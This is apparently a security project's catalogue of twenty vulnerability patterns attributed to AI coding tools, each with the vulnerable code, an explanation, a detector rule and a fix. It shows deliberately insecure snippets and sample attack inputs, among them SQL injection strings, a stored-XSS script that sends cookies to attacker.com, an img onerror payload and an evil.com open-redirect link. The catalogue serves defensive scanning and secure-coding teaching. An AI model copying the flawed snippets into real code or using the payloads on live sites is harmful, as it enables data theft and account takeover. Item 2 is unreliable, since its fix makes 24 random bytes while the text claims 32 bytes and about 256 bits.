# AI-Generated Code Antipatterns

This is a running catalogue of vulnerability patterns that AI coding tools
(Cursor, Claude Code, GitHub Copilot, ChatGPT, Windsurf, Cody, etc.) ship
by default unless you explicitly ask them not to. Every pattern below has
been observed in real AI output — they're not speculative.

The `tengen scan` detector column tells you which rule catches each
pattern. Items marked **no detector yet** are candidates for new rules;
open an issue or PR.

---

## 1. Template-literal SQL concatenation  ·  `SQLI-TEMPLATE`

**What the AI writes:**

```ts
const user = await db.query(
  `SELECT * FROM users WHERE email = '${email}' AND status = 'active'`
);
```

**Why it happens:** prompts like "get user by email" produce string-
interpolated SQL because it reads most naturally to a language model.
Unless you say "use parameterized queries," most tools don't.

**What breaks:** classic SQLi. `email = "'; DROP TABLE users; --"` and
your users table is gone. Or the attacker reads every other row by
supplying `' OR 1=1 --`.

**Fix:**

```ts
import { paramOnly } from 'tengen';

const q = paramOnly`SELECT * FROM users WHERE email = ${email} AND status = 'active'`;
const user = await db.query(q.text, q.values);  // driver parameterizes
```

Or use your driver's native parameterized API. Never concatenate.

---

## 2. Reset-token via `Math.random`  ·  `MATH-RANDOM-SECURITY`

**What the AI writes:**

```ts
async function createPasswordResetToken(userId: string) {
  const token = Math.random().toString(36).slice(2) + Date.now();
  await db.resetTokens.create({ userId, token });
  await sendEmail(...);
}
```

**Why it happens:** "generate a random token" gets `Math.random()`
because it's the first thing listed in MDN. Models don't distinguish
"random for animation jitter" from "random for cryptographic token."

**What breaks:** Math.random is a Mersenne Twister — predictable after
observing a handful of outputs. An attacker who registers two accounts
around the same time as you can predict your reset token window and
hijack the account.

**Fix:**

```ts
import { randomBytes } from 'tengen'; // or Node's crypto.randomBytes
const token = Array.from(randomBytes(24), (b) => b.toString(16).padStart(2,'0')).join('');
```

32 bytes of CSPRNG is ~256 bits of entropy. Unguessable.

---

## 3. Hardcoded API key in committed source  ·  `HARDCODED-SECRET`

**What the AI writes:**

```ts
const stripe = new Stripe('sk_live_51K...');
const openai = new OpenAI({ apiKey: 'sk-proj-abc...' });
```

**Why it happens:** the user pastes a key into the chat to test, the AI
inlines it into the code, and it never gets moved to an env var.

**What breaks:** the moment the repo is pushed to GitHub (even a private
repo — assume eventual leak), the key is effectively public. GitHub's
secret-scanning catches some patterns but not all. Secrets committed
once must be rotated — deleting the commit doesn't help because the
history is already archived by a dozen bots.

**Fix:** `process.env.STRIPE_SECRET_KEY` + `.env` in `.gitignore`.
Rotate anyway, because the old key is forever compromised.

---

## 4. `eval()` on JSON-ish strings  ·  `EVAL`

**What the AI writes:**

```ts
function parseConfig(raw: string) {
  return eval('(' + raw + ')');  // "supports JS object literal syntax"
}
```

**Why it happens:** models occasionally "optimize" JSON parsing by using
eval to support trailing commas or single quotes. It's terrifying.

**What breaks:** if any portion of `raw` ever comes from user input, it's
remote code execution. The attacker can put any JavaScript there —
`process.exit()`, `require('child_process').exec(...)`, exfiltrate
secrets.

**Fix:** `JSON.parse(raw)`. If you need relaxed syntax, use JSON5 as a
library, never `eval`. If you need config-as-code, use a schema-driven
parser, never `eval`.

---

## 5. `dangerouslySetInnerHTML` on user content  ·  `DANGEROUSLY-SET-INNERHTML`

**What the AI writes:**

```tsx
export function Bio({ user }) {
  return <div dangerouslySetInnerHTML={{ __html: user.bio }} />;
}
```

**Why it happens:** the user asked "render markdown/HTML bio" and the
model forgot the sanitization step. The name of the prop is literally
"dangerous" and it still gets inlined.

**What breaks:** stored XSS. An attacker saves `<script>
fetch('https://attacker.com/log?c=' + document.cookie) </script>` in
their bio; every visitor to their profile runs that script.

**Fix:**

```tsx
import DOMPurify from 'dompurify';

export function Bio({ user }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} />;
}
```

Or, better, render Markdown via a component library that produces DOM
nodes instead of strings (e.g., `react-markdown`).

---

## 6. `JSON.parse(req.body)` without validation  ·  `JSON-PARSE-REQUEST`

**What the AI writes:**

```ts
app.post('/api/profile', (req, res) => {
  const data = JSON.parse(req.body);
  db.profiles.update({ id: data.id }, data);
  res.json({ ok: true });
});
```

**Why it happens:** the AI writes the happy path. It assumes the request
body is well-formed because that's what the prompt implied.

**What breaks:**

- Prototype pollution if `data` has `__proto__`
- Deeply nested object → CPU DoS during `db.profiles.update` call
- Fields you didn't whitelist get written to the DB (mass assignment) —
  attacker sets `isAdmin: true`
- Crashes with 500 on malformed JSON, gives detailed stack trace back
  to the attacker

**Fix:**

```ts
import { z } from 'zod';
import { gate } from 'tengen';

const Profile = z.object({ id: z.string().uuid(), name: z.string().max(100) });

app.post('/api/profile', async (req, res) => {
  const body = JSON.parse(req.body);
  const parsed = await gate(Profile, body);
  if (!parsed.ok) { res.status(400).json({ error: 'bad request' }); return; }
  db.profiles.update({ id: parsed.value.id }, parsed.value);
  res.json({ ok: true });
});
```

---

## 7. Open redirect from query parameter  ·  `OPEN-REDIRECT`

**What the AI writes:**

```ts
app.get('/login', (req, res) => {
  // ... authenticate ...
  res.redirect(req.query.next || '/');
});
```

**Why it happens:** "redirect user back to where they came from" is a
reasonable request; the AI implements it the simplest way.

**What breaks:** phishing. Attacker sends victim a link to
`https://yoursite.com/login?next=https://evil.com/fake-login`. After
login, your server redirects to the attacker-controlled URL, which
mirrors your look-and-feel and steals the credentials on the next form.

**Fix:**

```ts
const ALLOWED = ['/', '/dashboard', '/settings'];
app.get('/login', (req, res) => {
  const next = String(req.query.next || '/');
  res.redirect(ALLOWED.includes(next) ? next : '/');
});
```

Or accept only a short code and look up the URL server-side.

---

## 8. CORS `*` with credentials  ·  `CORS-WILDCARD-CREDENTIALS`

**What the AI writes:**

```ts
app.use(cors({ origin: '*', credentials: true }));
```

**Why it happens:** CORS is confusing. "origin: * lets anyone use my
API, credentials: true lets me use cookies" — both sound good to the
model.

**What breaks:** browsers block `*` + credentials at runtime. But if you
manually set `Access-Control-Allow-Origin: *` alongside
`Access-Control-Allow-Credentials: true`, some legacy browsers honor
it — and any malicious site can read authenticated responses from
your API as if they were the logged-in user.

**Fix:**

```ts
const ALLOWED_ORIGINS = new Set(['https://app.example.com']);
app.use(cors({
  origin: (origin, cb) => cb(null, !origin || ALLOWED_ORIGINS.has(origin)),
  credentials: true,
}));
```

---

## 9. Server env leaked into client component  ·  `EXPOSED-ENV-CLIENT`

**What the AI writes:**

```tsx
'use client';
export function UploadButton() {
  return <button onClick={() => fetch(process.env.S3_UPLOAD_URL, {
    headers: { Authorization: `Bearer ${process.env.AWS_SECRET_KEY}` }
  })}>Upload</button>;
}
```

**Why it happens:** the AI doesn't track which env vars are safe to
ship to the browser. In Next.js, anything not prefixed `NEXT_PUBLIC_`
is server-only — and yet it compiles silently into the client bundle
if you reference it from a `'use client'` component.

**What breaks:** the secret ships in every page load. View-source finds
it in the first JS bundle. Attackers scrape Next.js sites looking for
exposed AWS keys.

**Fix:** move the call server-side. Create a `/api/upload` route. Keep
secrets on the server. Only `NEXT_PUBLIC_*` vars may touch the client.

---

## 10. Hardcoded JWT signing secret  ·  `JWT-HARDCODED-SECRET`

**What the AI writes:**

```ts
import jwt from 'jsonwebtoken';
export function sign(payload) {
  return jwt.sign(payload, 'supersecret');
}
```

**Why it happens:** the tutorial the model was trained on used a
literal "supersecret". You'd be surprised how many tutorials do.

**What breaks:** anyone with the source code can forge any JWT —
impersonate any user, elevate to admin, whatever the token grants.
The "secret" isn't secret.

**Fix:**

```ts
const SECRET = process.env.JWT_SECRET;
if (!SECRET || SECRET.length < 32) throw new Error('set JWT_SECRET');
export const sign = (payload) => jwt.sign(payload, SECRET, { algorithm: 'HS256' });
```

Better: use RS256/EdDSA (asymmetric). Sign with a private key, verify
with a published public key. Rotation becomes easier and you can expose
the verifier to third parties safely.

---

## 11. `innerHTML` assignment without sanitization  ·  `INNERHTML`

**What the AI writes:**

```js
function renderComment(commentHtml) {
  document.getElementById('comments').innerHTML += commentHtml;
}
```

**Why it happens:** "append HTML to the page" is a natural phrasing;
`innerHTML` is the answer.

**What breaks:** stored XSS the same way `dangerouslySetInnerHTML` does.
`<img src=x onerror=fetch(...)>` inside a comment runs when it renders.

**Fix:** use `textContent` for plain text, or DOMPurify before
innerHTML. For dynamic lists, build DOM nodes with `createElement` +
`append`.

---

## 12. `Function()` constructor  ·  `EVAL` (same detector)

**What the AI writes:**

```ts
function evaluate(expr: string) {
  return new Function('return (' + expr + ')')();
}
```

**Why it happens:** "a simple expression evaluator" gets the simplest
possible implementation, which is RCE-as-a-service.

**What breaks:** same as eval. If any piece of `expr` is attacker-
controlled, they run arbitrary code in your process.

**Fix:** use a safe expression evaluator library (e.g., `expr-eval`,
`jsonata`, or write a tiny recursive-descent parser for your specific
grammar).

---

## 13. Missing rate limit on auth endpoints  ·  *no detector yet*

**What the AI writes:** a login endpoint with no rate limiter.

**Why it happens:** rate limiting is cross-cutting; tools don't think
about it while writing a single handler.

**What breaks:** password brute-force, enumeration attacks.

**Fix:** drop in `express-rate-limit`, Cloudflare rate-limit rules,
Upstash, or a Redis-backed limiter. Every auth endpoint, every password
reset endpoint, every signup endpoint.

---

## 14. Unbounded file upload  ·  *no detector yet*

**What the AI writes:** `multer()` with defaults.

**Why it happens:** defaults are unlimited in many libraries; AI
doesn't know to set `limits.fileSize`.

**What breaks:** attacker uploads 20 GB → your disk fills up, your
process OOMs, your bill explodes.

**Fix:** `multer({ limits: { fileSize: 10 * 1024 * 1024 }})` plus a
check on content-type and extension.

---

## 15. Regex DoS via user-controlled pattern  ·  *no detector yet*

**What the AI writes:**

```ts
if (new RegExp(req.query.pattern).test(userBio)) { ... }
```

**Why it happens:** "let users search their own data with a regex" is a
reasonable-sounding feature until someone sends `(a+)+b` and pegs a CPU
core for a week.

**Fix:** don't accept user-provided regex. If you must, use a regex
engine with a timeout (Go's, Rust's) or the `re2` library.

---

## 16. Trust-the-client authorization  ·  *no detector yet*

**What the AI writes:**

```tsx
// client
if (user.isAdmin) return <AdminPanel />;
```

```ts
// server
app.delete('/api/users/:id', async (req, res) => {
  await db.users.delete(req.params.id);
  res.json({ ok: true });
});
```

**Why it happens:** the AI implements the UI logic and the API
separately. Nothing ties them.

**What breaks:** anyone can call `DELETE /api/users/:id` because the
server never checked `isAdmin`.

**Fix:** authorization on every endpoint, server-side, always. The UI
flag is cosmetic.

---

## 17. HTTP instead of HTTPS for service-to-service calls  ·  *no detector yet*

**What the AI writes:** `fetch('http://internal-api/...')`.

**Why it happens:** "internal = safe" mental model. It's not — VPC
peering, misconfigured firewalls, shared tenants all defeat this.

**Fix:** TLS everywhere, including inside your VPC. Short-lived mTLS
certs between services are ideal.

---

## 18. Using `bcrypt` with `1` or `4` rounds  ·  *no detector yet*

**What the AI writes:** `bcrypt.hash(pw, 4)`.

**Why it happens:** "what's a good number of rounds?" → "4 is fine for
tests" → ships in production.

**Fix:** minimum 12 rounds as of 2026. Use Argon2id if you have the
dependency budget.

---

## 19. Storing tokens in `localStorage`  ·  *no detector yet*

**What the AI writes:**

```ts
localStorage.setItem('token', token);
```

**Why it happens:** tutorial material. It works.

**What breaks:** any XSS anywhere on your domain steals the token.
HttpOnly cookies protect against that.

**Fix:** HttpOnly, Secure, SameSite=Lax (or Strict) cookie, set by the
server. CSRF tokens for state-changing requests.

---

## 20. Logging full request/response bodies  ·  *no detector yet*

**What the AI writes:**

```ts
console.log('request', req.body);
```

**Why it happens:** debugging left in.

**What breaks:** password fields, reset tokens, PII, API keys all end
up in your logging provider. If that provider is breached (or an
employee browses logs), everything leaks.

**Fix:** redact-before-log helper (`redactFields(['password', 'token'])`)
and make it the default everywhere.

---

## Contributing

Found a new antipattern in your AI-generated code? Open an issue with:

1. The minimal code snippet (anonymized)
2. Which tool produced it (Cursor, Claude Code, Copilot, ChatGPT, …)
3. Proof-of-exploit or explanation of the impact
4. Your suggested fix

If it's catchable with regex, we'll add a detector. If it needs AST
analysis, we'll document it here and link to the tool that catches it
(Semgrep, CodeQL).
